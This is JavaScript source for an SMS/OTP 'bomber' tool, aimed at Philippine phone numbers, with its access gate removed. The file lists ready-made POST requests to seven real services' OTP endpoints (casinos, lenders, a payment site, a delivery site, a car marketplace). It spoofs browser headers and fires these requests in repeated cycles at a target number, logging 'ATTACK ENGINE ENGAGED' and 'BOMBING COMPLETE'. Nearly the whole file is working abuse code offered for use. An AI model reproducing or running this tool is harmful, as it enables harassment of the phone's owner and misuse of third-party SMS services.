// TINANGGAL NA ANG LOGIN/ACCESS KEY PARA DUMIRETSO AGAD
async function bypassLogin() {
    document.getElementById('main-app-interface').style.display = 'block';
}
window.onload = bypassLogin;

const apiList = [
    {
        name: "LAKIWIN  ",
        fire: (t) => axios.post("https://www.lakiwin.com/service/mobile/check", {"phoneNumber": `0${t}`, "otpType": "LOGIN_OTP"}, {headers: {"Content-Type": "application/json;charset=UTF-8", "Origin": "https://www.lakiwin.com", "Referer": "https://www.lakiwin.com/", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"}, timeout: 10000})
    },
    {
        name: "S5_CASINO",
        fire: (t) => axios.post("https://api.s5.com/player/api/v1/otp/request", `phone_number=%2B63${t}`, {headers: {"Content-Type": "application/x-www-form-urlencoded"}, timeout: 10000})
    },
    {
        name: "FINBRO   ",
        fire: (t) => axios.post("https://api.finbro.ph/web/public/client/phone/sms-code", {"mobilePhone": {"number": `0${t}`}}, {headers: {"Content-Type": "application/json;charset=UTF-8", "Origin": "https://www.finbro.ph", "Referer": "https://www.finbro.ph/", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"}, timeout: 10000})
    },
    {
        name: "BISTRO   ",
        fire: (t) => axios.post("https://bistrodelivers.com.ph/p/api/s/v2/brand_venues/bvhvXayDs85SAFAZo6g6qctA/customers/otp", {"phone_number": t, "dial_code": "+63", "phone_country": "PH", "channel": "sms"}, {headers: {"Content-Type": "application/json", "Origin": "https://bistrodelivers.com.ph", "Referer": "https://bistrodelivers.com.ph/", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"}, timeout: 10000})
    },
    {
        name: "BAYAD    ",
        fire: async (t) => {
            const res = await axios.post("https://api.online.bayad.com/api/sign-up/otp", {"mobileNumber": `+63${t}`, "emailAddress": `u${Math.floor(Math.random() * 99) + 1}@gmail.com`}, {timeout: 5000, validateStatus: () => true});
            return res;
        }
    },
    {
        name: "FASTCASH ",
        fire: (t) => axios.post("https://api.fastcash.ph/v1/auth/otp", {"phone_number": `63${t}`}, {headers: {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 13; itel S23)", "Accept": "application/json"}, timeout: 25000})
    },
    {
        name: "CARMUDI  ",
        fire: (t) => axios.post("https://ucrf.carbay.com/sms/send-otp?countryCode=ph&langCode=en&businessUnit=cars&currencyCode=%E2%82%B1&isdCode=%2B63&pageType=used_lead&categoryId=1", {"otp": "", "mobile": t, "name": "jared daulfrish ", "siteName": "www.carmudi.com.ph", "businessUnit": "cars", "categoryId": "1", "countryCode": "ph", "currencyCode": "₱", "isdCode": "+63", "langCode": "en", "pageType": "used_lead"}, {headers: {"authority": "ucrf.carbay.com", "accept": "*/*", "content-type": "application/json; charset=UTF-8", "origin": "https://www.carmudi.com.ph", "referer": "https://www.carmudi.com.ph/", "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"}, timeout: 10000})
    }
];

async function start() {
    const num = document.getElementById('num').value;
    const amount = document.getElementById('otpAmount').value;
    const log = document.getElementById('log');
    if(!num || num.length < 10) return alert("ERROR: Enter 10-digit number.");

    log.innerHTML = "[+] ATTACK ENGINE ENGAGED...<br>";

    for(let i=1; i<=amount; i++) {
        log.innerHTML += "[CYCLE #" + i + "] Running All APIs...<br>";
        for (const api of apiList) {
            try {
                const res = await api.fire(num);
                log.innerHTML += "<span style='color: #0f0;'>[SUCCESS] " + api.name.trim() + "</span><br>";
            } catch (e) {
                log.innerHTML += "<span style='color: #f00;'>[FAILED] " + api.name.trim() + "</span><br>";
            }
            log.scrollTop = log.scrollHeight;
        }
        if (i < amount) {
            log.innerHTML += "[!] ANTI-SPAM REST: 15s...<br>";
            await new Promise(r => setTimeout(r, 15000));
        }
    }
    log.innerHTML += "[!] BOMBING COMPLETE.<br>";
}
